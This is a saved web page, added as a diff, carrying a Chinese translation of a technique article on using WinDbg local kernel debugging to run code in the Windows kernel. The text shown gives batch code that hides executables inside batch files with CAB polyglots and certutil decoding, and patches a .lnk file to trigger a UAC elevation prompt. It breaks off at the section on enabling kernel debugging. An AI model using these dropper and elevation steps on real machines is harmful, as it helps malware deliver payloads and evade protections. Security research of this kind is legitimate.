@@ -1,0 +1,1063 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】利用WinDbg本地内核调试器攻陷 Windows 内核 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="WinDbg,内核,调试,windows"/>
+    
+        <meta name="description" content="在本文中，我将为读者介绍一种利用windbg本地内核调试技术在Windows内核中执行代码的方法。通过该方法，我们会将代码直接放入内核内存空间中，然后通过hook一些线程来执行它。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】利用WinDbg本地内核调试器攻陷 Windows 内核</h2>
+                <div class="article-msg">
+                    <span class="time">2017-09-26 17:10:52</span>
+                    
+                                        <span class="read">阅读：7254次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4477"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4477" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/"
+                             target="_blank">来源： vallejo.cc</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;">
+    <img src="http://p0.qhimg.com/t013e404747519e71a8.png" title="t01298e7138169918be.png" alt="http://p3.qhimg.com/t01298e7138169918be.png"/>
+</p>
+<p style="text-indent: 0em;">
+    <br/>
+</p>
+<p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_self" style="color: rgb(0, 112, 192); line-height: 28px; font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">shan66</a>
+</p>
+<p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：200RMB</span>
+</p>
+<p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><br/></strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>概要</strong></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在本文中，我将为读者介绍一种利用windbg本地内核调试技术在Windows内核中执行代码的方法。当然，准确的说这并不是一个漏洞，因为这里只用到了windbg的正常功能，同时只使用了一个批处理文件（而不是powerhell或者vbs）和一些带有Microsoft的签名的可执行文件（其中一些已经是位于操作系统和windbg中的，我是通过批处理文件转储得到的）。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用该方法，无需在用户模式下启动可执行文件（当然某些Microsoft签名的可执行文件除外）或加载已签名的驱动程序。因此，PatchGuard和其他保护措施也无法阻止我们。 通过该方法，我们会将代码直接放入内核内存空间中，然后通过hook一些线程来执行它。正如我们将演示的那样，由一个简单的批处理文件组成的恶意软件将能够跳转到内核，通过本地内核调试技术和windbg使其代码得以在内核中执行。&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文由五个部分组成：</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>1.<span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>将文件转储到批处理文件中：将二进制文件嵌入并转储到批处理文件中的几种方法。</strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>2.<span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>以管理员身份执行批处理文件：这里介绍从批处理文件到获得UAC提示符的方法（不使用powershell、vbs ...）</strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>3.<span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>启用本地内核调试：如何从批处理文件中启用本地内核调试。</strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>4.<span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>使用windbg修补内核内存，从而注入并执行我们的代码：一种通过批处理文件使用windbg本地内核调试技术来修补内核内存并在内存中执行我们的代码的方法。</strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>5.<span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>最后，我们将把所有这些东西放在一起，打造一个概念验证式的批处理文件，它适用于Windows 8.1 x64机器，同时，我们还会进行一些相应的测试。&nbsp;</strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）将相关文件嵌入到磁盘上的批处理文件中</span></strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">实际上，可以有很多方法都可以达到该目的，这里挑几种加以介绍。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.1）创建一个.bab（也即.cab）：</span></strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以使用Microsoft工具makecab.exe（或Windows的早期版本中的cabarc.exe）来创建CAB文件。这些CAB文件用来存放我们要转储、压缩的文件。 但是我们还会添加一个未压缩的文件，即我们的第一个文件：我们的批处理文件。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要使用makecab.exe，我们必须给它提供一个.ddf文件的路径作为参数：</span>
+</p>
+<pre class="brush:ps;toolbar:false">makecab.exe / F makecab.ddf</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">该.ddf文件的作用是让makecab.exe创建CAB文件。 您可以在这里（</span><a href="https://msdn.microsoft.com/en-us/library/bb417343.aspx" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">https://msdn.microsoft.com/en-us/library/bb417343.aspx</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">）找到有关makecab.exe的信息，以及从这里（</span><a href="https://msdn.microsoft.com/en-us/library/bb417343.aspx#microsoftmakecabusersguide" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">https://msdn.microsoft.com/en-us/library/bb417343.aspx#microsoftmakecabusersguide</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">）找到关于microsoft cabinet格式的信息。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">假设我们有一个setup.exe文件（我们想要转储到磁盘的可执行文件）和一个setup.bat文件（主批处理文件）。&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Setup.bat:</span></strong>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:ps;toolbar:false">@echo off
+mkdir expanded
+expand %0 expanded -F:*
+expanded\setup.exe
+pause
+goto:eof</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们需要创建一个.ddf文件，其作用是让makecab.exe去创建一个包含setup.bat和setup.exe的CAB：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Makecab.ddf:</span></strong>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:ps;toolbar:false">.OPTION EXPLICIT ; Generate errors on variable typos
+.Set Cabinet=on
+.Set Compress=off
+.Set InfAttr= ; Turn off read-only, etc. attrs
+setup.bat 
+.Set Cabinet=on
+.Set Compress=on
+setup.exe</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">将setup.exe、setup.bat和makecab.ddf放在同一个目录中，然后执行命令：</span>
+</p>
+<pre class="brush:ps;toolbar:false">makecab.exe / F makecab.ddf</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">，这样就能获得相应的CAB文件了。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CAB文件的内容如下所示：&nbsp;</span>
+</p>
+<p style="text-align: center; text-indent: 0em;">
+    <img src="http://p0.qhimg.com/t0115050644457db45d.png" title="t01d46c329f81d2514c.png" alt="http://p4.qhimg.com/t01d46c329f81d2514c.png"/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以看到CAB文件中保存了两个文件，其中第一个文件是未压缩的批处理脚本，第二个文件是压缩过的setup.exe。 如果我们将.cab文件重命名为.bat，并执行该.bat文件，那么不会出现任何问题。第一个二进制文件的内容（CAB标头）将被批处理文件解释器忽略：它会尝试执行它，但它会显示错误消息，当解释器找到批处理未压缩的代码时，它会执行该代码，这时不会出现任何问题。这个批处理代码执行expand.exe，它是作为参数传递给我们的.bat文件（也就是CAB文件）的，并且CAB文件被解压缩到目录“expanded”中。 之后，就会执行setup.exe。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.2）转储ascii编码的二进制文件，使用certutil.exe进行解码：</span></strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本文中，我们将使用工具<strong>certutil.exe</strong>（相关信息请看这里<a href="https://technet.microsoft.com/en-us/library/cc732443.aspx">https://technet.microsoft.com/en-us/library/cc732443.aspx</a>&nbsp;）将二进制文件编码为文本，并将其嵌入到批处理文件中：&nbsp;</span>
+</p>
+<pre class="brush:ps;toolbar:false">certutil -encode file.bin file.enc</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">file.bin是一个二进制文件，其中包含：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x00 0x11 0x22 0x33 0x44 0x55 0x66 0x77 0x88 0x99 0xaa 0xbb 0xcc 0xdd 0xee 0xff</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编码后，我们得到一个文本文件file.enc：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:bash;toolbar:false">-----BEGIN CERTIFICATE-----
+ABEiM0RVZneImaq7zN3u/w==
+-----END CERTIFICATE-----</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们将这个文本嵌入到批处理文件中，即把它转储到磁盘，之后可以使用</span>
+</p>
+<pre class="brush:ps;toolbar:false">certutil -decode</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">将该文本再次解码为二进制文件。</span>
+</p>
+<p style="text-indent: 2em;">
+    <strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">批处理文件：&nbsp;</span></strong>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:ps;toolbar:false">@echo off
+call:DumpBlock setup.bat &quot;%temp%\file.enc&quot; _____binstart_____ _____binend_____
+certutil -decode &quot;%temp%\file.enc&quot; &quot;%temp%\file.bin&quot;
+goto:eof
+:DumpBlock
+@echo off
+SetLocal EnableDelayedExpansion
+echo. %~1 %~2 %~3 %~4
+set SrcFile=%~1
+set DestFile=%~2
+set StartBlockMark=%~3
+set EndBlockMark=%~4
+set Flag=0
+del /F %DestFile%
+for /f &quot;tokens=* delims=&quot; %%a in (&#39;type %SrcFile%&#39;) do (
+if !Flag! EQU 2 (echo &quot;set Flag=1&quot;&amp;set Flag=1)
+if /i &quot;%StartBlockMark%&quot; EQU &quot;%%a&quot; (echo &quot;set Flag=2&quot;&amp;set Flag=2) 
+if /i &quot;%EndBlockMark%&quot; EQU &quot;%%a&quot; (echo &quot;set Flag=0&quot;&amp;set Flag=0) 
+if !Flag! EQU 1 (echo %%a &gt;&gt; %DestFile%)
+)
+goto:eof
+@echo off
+ if &quot;%~1&quot;==&quot;&quot; (call :usage) else call :%*
+exit /b
+_____binstart_____
+-----BEGIN CERTIFICATE-----
+ABEiM0RVZneImaq7zN3u/w==
+-----END CERTIFICATE-----
+_____binend_____</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">正如我们在前面的代码中看到的，其有一个名为DumpBlock的函数。该函数会接收一个文件的路径和两个标签，将其作为批处理文件的参数，然后将这两个标签之间的内容转储到文件中。将文本转储到文件（file.enc）后，调用certutil将其解码为二进制文件：</span>
+</p>
+<pre class="brush:ps;toolbar:false">certutil -decode file.enc file.bin</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过这种方式，我们可以将文件（可执行文件或任何类型的文件）嵌入到批处理文件中，并在脚本执行时将其转储。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2）以管理员身份执行批处理文件</span></strong></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您使用的是PowerShell或Vbs，可以有多种方式让UAC提示用户以管理员身份执行我们的应用程序。但是，这里我只想使用批处理语法。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在通过批处理文件显示UAC提示方面，我决定另辟蹊径：转储指向我自己的批处理文件的.LNK文件。这个.LNK相当于勾选了“Run as administrator”选项。这样，当.LNK重新启动我们的批处理文件时，如果我们没有管理员权限，将显示UAC提示符。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了创建.LNK，我们可以创建一个简单的Windows链接，并设置“<strong>Run as administrator</strong>”选项：&nbsp;</span>
+</p>
+<p style="text-align: center; text-indent: 0em;">
+    <img src="http://p0.qhimg.com/t0157b132171fadf8b4.png" title="t013746918a0e32e02d.png" alt="http://p1.qhimg.com/t013746918a0e32e02d.png"/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们将.lnk与另外一个没设置“以管理员身份”选项的.lnk进行比较，就会发现只有一个标志发生了变化：&nbsp;</span>
+</p>
+<p style="text-align: center; text-indent: 0em;">
+    <img src="http://p8.qhimg.com/t01ba81d25099704783.png" title="t01e6ce32b883670e40.png" alt="http://p1.qhimg.com/t01e6ce32b883670e40.png"/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了创建自己的.LNK，还必须完成一项工作。当我们创建它时，Windows会将绝对路径插入目标文件中，但LNK文件只能使用相对路径和环境变量。 因此，我们需要使用十六进制编辑器将绝对路径改为相对路径：.\setup.bat，或改为含有环境变量的路径：％temp％\ setup.bat：&nbsp;</span>
+</p>
+<p style="text-align: center;">
+    <img src="http://p1.qhimg.com/t019751d7dd2c3ab11d.png" title="t013b919cd0d546ed78.png" alt="http://p7.qhimg.com/t013b919cd0d546ed78.png"/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后一步是将这个.lnk嵌入到批处理文件中，并使用第一部分中暴露的方法来转储它。 当.LNK文件就绪后，我们就可以将我们的bat复制到％temp％\ setu_.bat，然后我们通过.lnk文件来执行它们了：</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">批处理文件：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:ps;toolbar:false">if &quot;%CD%&quot; == &quot;%systemroot%\system32&quot; (
+ if &quot;%~dp0&quot; == &quot;%TEMP%\&quot; (
+ rem HERE WE ARE BEING EXECUTED AS ADMIN 
+ goto:eof
+ )
+)
+copy setup.bat &quot;%temp%\setu_.bat&quot;
+start %temp%\promptUAC.lnk</pre>
+<p style="text-indent: 2em;">
+    <br/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3）启用本地内核调试</span></strong></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了启用本地内核调试，需要重新启动计算机。当然，恶意软件在使用这个简单的代码通过批处理文件来启用本地内核调试和重新启动通常不会有太大的问题：</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">批处理文件：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
